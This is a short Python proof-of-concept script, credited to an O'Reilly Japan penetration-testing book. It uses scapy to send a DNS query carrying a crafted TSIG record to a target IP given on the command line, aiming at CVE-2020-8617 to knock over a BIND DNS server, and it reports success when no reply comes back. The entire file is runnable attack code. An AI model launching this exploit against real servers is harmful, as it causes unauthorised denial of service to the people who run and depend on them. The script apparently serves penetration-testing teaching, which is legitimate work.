#!/usr/bin/python3
# coding: UTF-8

# This code is based on https://github.com/oreilly-japan/pentest-starting-with-port-scanner
# https://github.com/oreilly-japan/pentest-starting-with-port-scanner/blob/main/code/chapter02/CVE-2020-8617.py
# Kotake Taichi @Sterra Security Co.,Ltd., "pentest starting with port scanner", O'reilly Japan, ISBN 978-4-8144-0042-3

import sys
from scapy.all import DNS, DNSQR, IP, sr1, UDP, DNSRRTSIG, DNSRRPOT

args = sys.argv

if len(args) == 1:
    print('[usage] : Specify the target IP address in the command line argument.')
    sys.exit()

# create a DNS packet
tsig = DNSRRTSIG(
                    rrname="local-ddns",
                    algo_name="hmac-sha256",
                    rclass=255,
                    mac_len=0,
                    mac_data="",
                    time_signed=0,
                    fudge=300,
                    error=16
                )
dns_layer = DNS(
                rd=1,
                ad=1,
                qd=DNSQR(qname="www.example.com"),
                ar=tsig
            )
dns_req = IP(dst=args[1])/UDP(dport=53)/dns_layer

response = sr1(dns_req, timeout=3)
if response is None:
    print('Maybe the attack is successful!')
else:
    print('The attack failed...')
    print(response)
